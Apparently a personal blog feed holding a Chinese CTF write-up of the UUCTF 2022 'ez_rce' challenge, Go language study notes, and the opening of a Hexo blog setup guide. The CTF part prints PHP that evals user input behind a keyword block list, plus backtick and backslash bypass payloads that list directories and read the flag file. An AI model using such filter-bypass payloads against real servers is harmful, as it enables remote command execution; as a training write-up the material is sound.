id="3090-UUCTF-2022-新生赛-ez-rce-–命令执行函数-–反引号绕过-–反斜杠绕过-–eval-支持函数-–有问题尚未解决"><a href="#3090-UUCTF-2022-新生赛-ez-rce-–命令执行函数-–反引号绕过-–反斜杠绕过-–eval-支持函数-–有问题尚未解决" class="headerlink" title="3090_[UUCTF 2022 新生赛]ez_rce –命令执行函数 –反引号绕过 –反斜杠绕过 –eval()支持函数 –有问题尚未解决"></a>3090_[UUCTF 2022 新生赛]ez_rce –命令执行函数 –反引号绕过 –反斜杠绕过 –eval()支持函数 –有问题尚未解决</h2><p>&emsp;&emsp;进入环境得到PHP代码？？？真是恶劣的讽刺啊，必须狠狠炮制它，审计代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class="line"><span class="comment">// GET方式传入参数code</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="comment">// code参数应为命令执行语句，且需要避开正则表达式的匹配</span></span><br><span class="line">    <span class="keyword">if</span>         (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;很好，只需要绕过正则表达式的匹配就好了，看着强度评价为还不如题439，直接试试URL取反：<code>system(&quot;ls /&quot;)</code></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3090_%E5%8F%96%E5%8F%8D%E7%BB%93%E6%9E%9C.png" title="3090_取反结果"></p><p>&emsp;&emsp;？？？为什么不能用？已老实，尝试其他的方法，观察到正则表达式中并没有包括反引号“&#96;”和反斜杠“\”，从此入手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sy\stem(&quot;l\s&quot;)          =&gt; 不行</span><br><span class="line">s\ystem(&quot;l\s&quot;)          =&gt; 不行</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;又不会了，system()函数中的字符串又没有办法用反斜杠，只能重新去查eval()函数还支持哪些函数</p><table><thead><tr><th>函数类型</th><th>函数名</th><th>描述</th></tr></thead><tbody><tr><td><strong>输出函数</strong></td><td><code>echo</code></td><td>输出一个或多个字符串到标准输出（通常是浏览器）</td></tr><tr><td></td><td><code>print</code></td><td>输出一个字符串到标准输出</td></tr><tr><td></td><td><code>printf</code> &#x2F; <code>sprintf</code></td><td>格式化输出字符串（<code>printf</code>直接输出，<code>sprintf</code>返回字符串）</td></tr><tr><td></td><td><code>var_dump</code></td><td>打印变量的详细信息，包括类型和值</td></tr><tr><td></td><td><code>var_export</code></td><td>返回或打印变量的字符串表示（可用于重新构造变量）</td></tr><tr><td></td><td><code>print_r</code></td><td>打印变量的易于理解的信息（通常用于数组和对象）</td></tr><tr><td><strong>命令执行函数</strong></td><td><code>shell_exec</code></td><td>通过shell环境执行命令，并将完整的输出作为字符串返回</td></tr><tr><td></td><td><code>exec</code></td><td>执行一个外部程序，但只返回最后一行输出（可通过第二个参数获取完整输出）</td></tr><tr><td></td><td><code>system</code></td><td>执行外部程序，并显示输出（与<code>exec</code>类似，但直接输出到标准输出）</td></tr><tr><td></td><td><code>passthru</code></td><td>执行外部程序，并原样传递输出（适用于二进制数据）</td></tr><tr><td></td><td><code>popen</code> &#x2F; <code>pclose</code></td><td>打开进程文件指针，用于读写（与<code>shell_exec</code>和<code>exec</code>类似，但提供了更灵活的交互方式）</td></tr><tr><td></td><td><code>backticks (</code>)</td><td>反引号（与<code>shell_exec</code>功能类似，但直接在字符串中使用）</td></tr></tbody></table><p>&emsp;&emsp;OK，原来不止有system()函数啊，再来试试正则表达式里面没有过滤的print函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print `l\s`;                            =&gt; error.log index.php</span><br><span class="line">print `l\s /`;               </span><br><span class="line">=&gt; bin boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line">print `ca\t /fffffffffflagafag`;        =&gt; 无</span><br><span class="line">print `mo\re /fffffffffflagafag`;</span><br><span class="line">print `c\at /fffffffffflagafag`;        =&gt; flag</span><br><span class="line">print `ta\c /fffffffffflagafag`;        =&gt; flag</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;搞不懂了，都是文件读取指令，都用反斜杠绕过了，咋不同的插入位置效果不同呢？总之是把flag解出来了</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3090_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3090_结果展示"></p>]]></content>
      
      
      <categories>
          
          <category> CTF Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言学习笔记</title>
      <link href="/2024/11/11/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/11/11/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基于Go指南的个人总结"><a href="#基于Go指南的个人总结" class="headerlink" title="基于Go指南的个人总结"></a>基于Go指南的个人总结</h1><p>&emsp;&emsp;博主通过Go官网提供的<a href="https://tour.go-zh.org/">学习文档</a>进行Go语言的学习，并整理笔记，记录如下！</p><span id="more"></span><!-- toc --><h2 id="一、包、函数、变量、常量"><a href="#一、包、函数、变量、常量" class="headerlink" title="一、包、函数、变量、常量"></a>一、包、函数、变量、常量</h2><h4 id="1、包的导入与导出"><a href="#1、包的导入与导出" class="headerlink" title="1、包的导入与导出"></a>1、包的导入与导出</h4><p>&emsp;&emsp;<strong>包的导入</strong>：无论导入一个包还是多个包，为了便于后续再添加、更改，使用如下语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;package1&quot;</span>                <span class="comment">// 熟悉吗，Go的注释方法同C、C++一致</span></span><br><span class="line">    <span class="string">&quot;package2/package3&quot;</span>       <span class="comment">// 导入package2包中的package3子包</span></span><br><span class="line">    <span class="string">&quot;package4&quot;</span>                <span class="comment">// 导入package4</span></span><br><span class="line">    ····</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>包的导入</strong><span style="background-color: yellow;"> <strong>&gt; 注</strong></span>：导入的包必须使用，不使用则Go语言会报错 —-&gt; “包名” imported and not used</p><p>&emsp;&emsp;<strong>包的导出</strong>：在自定义包&#x2F;标准库中，如果你想让其他包访问某些函数、类型、变量或常量，你需要以大写字母开头来声明它们；在引用某一包中的元素时，需要增加包名作前缀以使程序识别</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span>               <span class="comment">// 导入math中的rand包，包名即为rand</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>                     <span class="comment">// 导入fmt包，包名即为fmt</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(rand.Intn(<span class="number">100</span>))      <span class="comment">// 生成一个0到99之间的随机整数并输出</span></span><br><span class="line">    <span class="comment">// fmt.println(rand.Intn(100))   // 错误，因为能导出包的首字母均大写，引用包中属性时，也需要首字母大写</span></span><br><span class="line">    <span class="comment">// fmt.Println(math.Intn(100))   // 错误，前缀需为包名，故引用函数Intn()前应加rand</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、函数定义"><a href="#2、函数定义" class="headerlink" title="2、函数定义"></a>2、函数定义</h4><p>&emsp;&emsp;<strong>函数基本结构：func ~1 ( ~2 ) ( ~3 ) { ~4 }</strong></p><p>&emsp;&emsp;~1：<strong>函数名</strong>，首字母大写与小写会导致函数是否能被导出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Myfunction</span><span class="params">()</span></span> &#123;&#125;   <span class="comment">// 可以被外部程序导出并使用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">()</span></span> &#123;&#125;   <span class="comment">// 只能在包内部才能被识别，外界无法使用</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~2：<strong>参数列表</strong>，可以设置1或多个传入参数，也可以不设置参数；设置参数需要参数名与参数类型，参数名在参数类型前面</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">()</span></span> &#123;&#125;                     <span class="comment">// 不设置参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x <span class="type">int</span>)</span></span> &#123;&#125;                <span class="comment">// 设置int型参数x</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x <span class="type">int</span>, y <span class="type">int</span>)</span></span> &#123;&#125;         <span class="comment">// 设置int型参数x、y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x, y <span class="type">int</span>)</span></span> &#123;&#125;             <span class="comment">// 多个相同类型参数可以合并参数类型写于末尾</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x <span class="type">int</span>, y <span class="type">string</span>)</span></span> &#123;&#125;      <span class="comment">// 设置int型参数x，string型参数y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x, y <span class="type">int</span>, z <span class="type">string</span>)</span></span> &#123;&#125;   <span class="comment">// 设置int型参数x、y，string型参数z</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~3：<strong>返回值</strong>，可以设置一个或多个返回值，逗号分隔；(<span style="background-color: yellow;"> <strong>特色！</strong></span>:返回值也可以取名字，作用独特)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;&#125;               <span class="comment">// 单个返回值或无返回值可以省略括号</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">string</span>) &#123;&#125;     <span class="comment">// 多返回值需对应一一点名类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;&#125;        <span class="comment">// 多个相同类型返回值，类型不能省去(没有人会这么想吧我想)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;&#125;        <span class="comment">// 当然，当返回值取了名字，就不一样了，相同类型返回值可以合并</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~3 &gt; <strong>特性</strong>：当返回值有名字后，被称为命名返回值或裸返回值，它们会被视作定义在函数顶部的变量，当函数使用的return语句不跟参数时，会自动返回这些特殊的返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一般返回值：return语句后必须跟参数，逗号隔开，类型顺序对应</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> b, a</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 命名返回值、一般返回值不可混合使用</span></span><br><span class="line">：<span class="keyword">return</span>语句后允许不跟参数，自动按序返回命名返回值的值</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果不对这些返回值赋值，它们会正常输出程序自动初始化的值，int型为0，string型为&quot;&quot;，bool型为false</span></span><br><span class="line">    <span class="comment">// 在返回值中声明命名返回值，等效为在函数开头将其视为变量声明，比如此例，即为下述两行：</span></span><br><span class="line">    <span class="comment">// x = 0</span></span><br><span class="line">    <span class="comment">// y = 0</span></span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当然你也可以声明命名返回值后在使用return时继续跟上对应参数，一旦return后跟上参数，参数必须同返回值数量、类型、顺序一致</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>, z <span class="type">string</span>) &#123;</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    y = <span class="number">2</span></span><br><span class="line">    z = <span class="string">&quot;China&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>, <span class="number">4</span>, <span class="string">&quot;Power&quot;</span>        <span class="comment">// 不会返回 1 2 China ，返回 2 4 Power</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 错误1：声明返回值后，函数体中必须使用return语句</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;&#125;     <span class="comment">// 返回错误提示：missing return</span></span><br><span class="line"><span class="comment">// 错误2：命名返回值、一般返回值不可混合使用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x <span class="type">int</span>, <span class="type">int</span>) &#123;    <span class="comment">// 返回错误提示：mixed named and unnamed parameters</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~4：<strong>函数体</strong>，没啥好说的，注意声明返回值后，函数体中必须使用return语句即可</p><h4 id="3、变量声明"><a href="#3、变量声明" class="headerlink" title="3、变量声明"></a>3、变量声明</h4><p>&emsp;&emsp;<strong>声明区域</strong>：可以声明在包内或函数内，包级别声明的变量包内全局可被访问修改，而函数级别声明的变量只在函数体内有效</p><p>&emsp;&emsp;<strong>变量声明的一般方法</strong>：使用var语句可以声明一或多个变量，允许声明的类型、位置均不限，声明的格式为“ 变量名 变量类型”</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span>, y <span class="type">bool</span>                     <span class="comment">// 每次声明的变量间逗号隔开，若没有在声明时赋值，则变量自动初始化为默认值</span></span><br><span class="line"><span class="keyword">var</span> x, y <span class="type">int</span>                          <span class="comment">// 当&quot;所有声明&quot;的变量均一致时，可以将变量类型合并置于末尾</span></span><br><span class="line"><span class="keyword">var</span> x, y = <span class="number">1</span>, <span class="literal">true</span>                    <span class="comment">// 懒人方法，当你声明变量时对其赋初始值时，可以不在声明时注明类型，程序自动推断</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>短变量声明</strong>：使用 :&#x3D; 短赋值语句可以为函数体级别的变量进行声明，语法为：变量名 :&#x3D; 初始值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">k := <span class="number">12</span>                       <span class="comment">// k被自动推断为int型</span></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="number">3.14</span>, <span class="string">&quot;China&quot;</span>   <span class="comment">// 当然，一次性可以声明一或多个变量</span></span><br><span class="line"><span class="comment">// 如果初始值是一变量，则自动认为是该变量的类型</span></span><br><span class="line"><span class="keyword">var</span> name <span class="type">string</span></span><br><span class="line">firstname := name             <span class="comment">// k被自动推断为string型</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>Go的变量类型</strong>：不报菜名了，<a href="https://tour.go-zh.org/basics/11">点这里☜</a></p><p>&emsp;&emsp;<strong>Go的变量类型</strong><span style="background-color: yellow;"> <strong>&gt; 注-1</strong></span>：int、uint、uintptr的位数同操作系统有关</p><p>&emsp;&emsp;<strong>Go的变量类型</strong><span style="background-color: yellow;"> <strong>&gt; 注-2</strong></span>：var语句可以一个代码块的方式声明变量，建议以后均使用此语法，便于添加、修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    a <span class="type">int</span>    = <span class="number">1</span>  </span><br><span class="line">    b, c <span class="type">int</span> = <span class="number">2</span>, <span class="number">3</span>  </span><br><span class="line">    d        = <span class="number">4</span></span><br><span class="line">    e        = <span class="string">&quot;China&quot;</span></span><br><span class="line">    f <span class="type">string</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>类型转换</strong>：使用表达式T(v)，其中T为需转化为的变量类型，v为转化变量本身，使用该表达式不会对变量v本身造成影响</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>                    <span class="comment">// x声明为int型变量</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="type">float32</span>(x)           <span class="comment">// 表达式返回一个float32型变量，其值为x，y通过初始化确定其类型也为float32</span></span><br><span class="line">z := <span class="type">float32</span>(x)              <span class="comment">// 短赋值语句也可以使用</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>类型转换</strong><span style="background-color: yellow;"> <strong>&gt; 注</strong></span>：不是任意变量的类型转换均可使用该表达式，这里特别指出与其余主流编程语言的不同，即字符串和数值无法互相转换，布尔型数据也无法和数值型变量互相转换</p><h4 id="4、常量声明"><a href="#4、常量声明" class="headerlink" title="4、常量声明"></a>4、常量声明</h4><p>&emsp;&emsp;<strong>声明区域</strong>：同变量声明机制完全相同</p><p>&emsp;&emsp;<strong>声明方法</strong>：常量的声明只能使用const关键字，不能使用 :&#x3D; 语句，且常量的声明必须初始化；常量的类型仅字符、字符串、布尔值或数值四种，其格式为：const 常量名 常量类型 &#x3D; 初始化值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x <span class="type">int</span> = <span class="number">1</span>                       <span class="comment">// x为int型常量1</span></span><br><span class="line"><span class="keyword">const</span> y, z <span class="type">int</span> = <span class="number">2</span>, <span class="number">2</span>                 <span class="comment">// 相同类型常量，其类型可合并</span></span><br><span class="line"><span class="keyword">const</span> p, q = <span class="number">3</span>, <span class="string">&quot;China&quot;</span>               <span class="comment">// 同样，由于进行了初始化，常量类型可不写明，但这我并不建议</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>声明方法</strong><span style="background-color: yellow;"> <strong>&gt; 注</strong></span>：同var语句声明变量一样，const关键字也可以一个代码块的方式声明变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    a    = <span class="number">1</span>  </span><br><span class="line">    b, c = <span class="number">2</span>, <span class="number">3</span>  </span><br><span class="line">    d    = <span class="string">&quot;China&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>未指定类型常量的特点</strong>：一个未指定类型的常量由上下文来决定其类型，故建议声明时即显式确定其类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如，根据算术运算式确定类型</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="number">1</span>  </span><br><span class="line"><span class="keyword">const</span> b = <span class="number">2.0</span>  </span><br><span class="line"><span class="keyword">const</span> c = a + b         <span class="comment">// c被推断为float64型，因为b是float64型，而a会被提升为float64运算</span></span><br></pre></td></tr></table></figure><h2 id="二、for、if、else、switch和defer"><a href="#二、for、if、else、switch和defer" class="headerlink" title="二、for、if、else、switch和defer"></a>二、for、if、else、switch和defer</h2><h4 id="1、for循环的多种用法"><a href="#1、for循环的多种用法" class="headerlink" title="1、for循环的多种用法"></a>1、for循环的多种用法</h4><p>&emsp;&emsp;<strong>一般结构：for ~1; ~2; ~3 { ~4}</strong></p><p>&emsp;&emsp;~1：<strong>变量声明初始化语句</strong>，可选，在进入循环之前定义，只能使用 :&#x3D; 语句，所定义的变量只存活于该for循环内</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123; fmt.Println(i) &#125;         <span class="comment">// i被声明为0，可以被循环体中的fmt.Println(i)访问</span></span><br><span class="line">    <span class="comment">// for var i = 0; i &lt; 10; i++ &#123; fmt.Println(i) &#125;   // 错误，不可以使用var语句，返回报错：var declaration not allowed in for initializer</span></span><br><span class="line">    <span class="comment">// fmt.Println(i)                                  // 外界不可访问for中的i，返回报错：undefined: i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~2：<strong>进入循环条件表达式</strong>，可选，在每次循环开始前执行表达式，为真则进入循环</p><p>&emsp;&emsp;~3：<strong>后置语句</strong>，可选，在每次循环结束后执行一次</p><p>&emsp;&emsp;~4：<strong>循环体</strong>，可以为空，循环体中语句运行完即运行后置语句</p><p>&emsp;&emsp;<strong>作为while使用：for ~2 { ~4}</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="number">10</span> &#123; i += i &#125;       <span class="comment">// 等效于C++中的while (i &lt; 10) &#123; i += i;&#125;</span></span><br><span class="line">    fmt.Println(i)              <span class="comment">// 输出应为16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>无限循环：for { ~4 }</strong>，慎用且一般不用或避免使用</p><h4 id="2、if判断语句"><a href="#2、if判断语句" class="headerlink" title="2、if判断语句"></a>2、if判断语句</h4><p>&emsp;&emsp;<strong>语句结构：if ~1; ~2 { ~3 }</strong></p>]]></content>
      
      
      <categories>
          
          <category> Programming Language Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客献给建博客的自己</title>
      <link href="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Hexo和GitHub-Pages搭建个人博客"><a href="#利用Hexo和GitHub-Pages搭建个人博客" class="headerlink" title="利用Hexo和GitHub Pages搭建个人博客"></a>利用Hexo和GitHub Pages搭建个人博客</h1><p>&emsp;&emsp;博主在利用Hexo和GitHub Pages创建本博客网站时，几经波折得以建成，又几经波折得以发送出人生中第一篇博客。现将流程及所遇问题梳理如下，唯望前人栽树，后人乘凉。</p><span id="more"></span><!-- toc --><h2 id="1、预备工作"><a href="#1、预备工作" class="headerlink" title="1、预备工作"></a>1、预备工作</h2><p>&emsp;&emsp;环境准备：安装<span style="background-color: yellow;">Node.js</span>，用于使用npm包管理器，附官网 <a href="https://nodejs.org/en">https://nodejs.org/en</a></p><p>&emsp;&emsp;工具准备：安装<span style="background-color: yellow;">Git</span>，用于远程拉取和上传，附官网<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">VsCode</span>，用于后期修改代码，附官网<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">Typora</span>，用于更方便的编写Markdown文档，需收费，附官网<a href="https://typora.io/">https://typora.io/</a></p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;(可以逃课，CSDN博主阿辉的日常：<a 